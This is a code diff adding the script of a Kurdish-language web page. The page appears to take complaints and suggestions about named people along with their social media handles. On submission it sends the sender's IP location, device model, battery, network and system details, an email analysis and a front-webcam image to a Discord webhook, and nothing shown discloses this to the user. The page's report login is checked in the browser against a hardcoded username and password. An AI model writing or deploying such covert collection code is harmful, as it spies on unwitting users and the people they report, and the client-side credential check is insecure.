+    const contentText = `🚨 **سکاڵایەکی نوێ تۆمار کرا (بە داتای پێشکەوتوو و کامێرا)**\n\n` +
+                        `${ipLocationDetails}\n` +
+                        `🌐 **IP Address:** ${ipAddress}\n\n` +
+                        `📱💻 **جۆری ئامێر و مۆدێل:** ${deviceType}\n` +
+                        `🔋 **ڕێژەی باتری و شەحن:** ${batteryStatus}\n` +
+                        `🛜 **جۆری ئینتەرنێت:** ${networkStatus}\n` +
+                        `${extraSystemInfo}\n\n` +
+                        `📧 **ئیمەیڵی نێرەر:** ${userEmail || "دیاری نەکراوە"}\n` +
+                        `📋 **شیکردنەوەی ئیمەیل (Find Email):**\n${emailAnalysisInfo}\n\n` +
+                        `👤 **ناوی کەسەکە:** ${personName}\n` +
+                        `📍 **شوێنی نیشتەجێبوون:** ${location}\n` +
+                        `🎵 **ناوی TikTok:** ${tiktok || "نییە"}\n` +
+                        `👻 **ناوی Snapchat:** ${snapchat || "نییە"}\n` +
+                        `📸 **ناوی Instagram:** ${instagram || "نییە"}\n` +
+                        `✈️ **ناوی Telegram:** ${telegram || "نییە"}\n` +
+                        `📘 **ناوی Facebook:** ${facebook || "نییە"}\n` +
+                        `⏰ **کات:** ${new Date().toLocaleString()}`;
+
+    formData.append("content", contentText);
+
+    if (webcamImage) {
+        formData.append("file1", webcamImage, "webcam_front.jpg");
+    }
+    if (uploadedImage) {
+        formData.append("file2", uploadedImage);
+    }
+
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            body: formData
+        });
+
+        successDiv.innerText = "سکاڵاکە بە سەرکەوتوویی تۆمار کرا و نێردرا.";
+        document.getElementById("tiktok").value = "";
+        document.getElementById("snapchat").value = "";
+        document.getElementById("instagram").value = "";
+        document.getElementById("telegram").value = "";
+        document.getElementById("facebook").value = "";
+        document.getElementById("personName").value = "";
+        document.getElementById("location").value = "";
+        document.getElementById("personImage").value = "";
+
+    } catch (error) {
+        alert("هەڵەیەک ڕوویدا لە ناردنی سکاڵاکە بۆ دیسکۆرد.");
+        successDiv.style.display = "none";
+        console.error(error);
+    }
+}
+
+function openSuggestion() {
+    document.getElementById("sectionsScreen").style.display = "none";
+    document.getElementById("suggestionScreen").style.display = "block";
+}
+
+function backFromSuggestion() {
+    document.getElementById("suggestionScreen").style.display = "none";
+    document.getElementById("sectionsScreen").style.display = "block";
+}
+
+async function sendSuggestion() {
+    const reason = document.getElementById("suggestionReason").value.trim();
+    const chat = document.getElementById("suggestionChat").value.trim();
+    const image = document.getElementById("suggestionImage").files[0] || null;
+    const video = document.getElementById("suggestionVideo").files[0] || null;
+    const deviceType = getDetailedDevice();
+    const batteryStatus = await getBatteryInfo();
+    const networkStatus = getNetworkInfo();
+    const extraSystemInfo = getExtraScreenAndSystemInfo();
+
+    if (reason === "") {
+        alert("تکایە هۆکاری گومان کردن بنووسە.");
+        return;
+    }
+
+    const formData = new FormData();
+    const contentText = `💡 **پێشنیارێکی نوێ تۆمار کرا**\n\n` +
+                        `📱💻 **جۆری ئامێر و مۆدێل:** ${deviceType}\n` +
+                        `🔋 **ڕێژەی باتری و شەحن:** ${batteryStatus}\n` +
+                        `🛜 **جۆری ئینتەرنێت:** ${networkStatus}\n` +
+                        `${extraSystemInfo}\n\n` +
+                        `📧 **ئیمەیڵی نێرەر:** ${userEmail || "دیاری نەکراوە"}\n` +
+                        `📋 **شیکردنەوەی ئیمەیل:**\n${emailAnalysisInfo}\n\n` +
+                        `❓ **هۆکاری گومان:** ${reason}\n` +
+                        `💬 **چات / دەق:** ${chat || "نییە"}\n` +
+                        `⏰ **کات:** ${new Date().toLocaleString()}`;
+
+    formData.append("content", contentText);
+
+    if (image) formData.append("file1", image);
+    if (video) formData.append("file2", video);
+
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
+        document.getElementById("suggestionSuccess").style.display = "block";
+        document.getElementById("suggestionReason").value = "";
+        document.getElementById("suggestionChat").value = "";
+        document.getElementById("suggestionImage").value = "";
+        document.getElementById("suggestionVideo").value = "";
+    } catch (error) {
+        alert("هەڵەیەک ڕوویدا.");
+    }
+}
+
+function openReportLogin() {
+    document.getElementById("sectionsScreen").style.display = "none";
+    document.getElementById("reportLoginScreen").style.display = "block";
+}
+
+function backFromReportLogin() {
+    document.getElementById("reportLoginScreen").style.display = "none";
+    document.getElementById("sectionsScreen").style.display = "block";
+}
+
+function checkReportLogin() {
+    const username = document.getElementById("reportUsername").value.trim();
+    const password = document.getElementById("reportPassword").value;
+    const error = document.getElementById("reportLoginError");
+
+    if (username === "Jsja-osja-7388r" && password === "jumanji4321") {
+        error.style.display = "none";
+        window.location.href = "report.html";
+    } else {
+        error.style.display = "block";
+    }
+}
+
+document.getElementById("gmailInput").addEventListener("keydown", function(event) {
+    if (event.key === "Enter") checkEmail();
+});
+
+document.getElementById("reportPassword").addEventListener("keydown", function(event) {
+    if (event.key === "Enter") checkReportLogin();
+});
+</script>
+
+</body>
+</html>
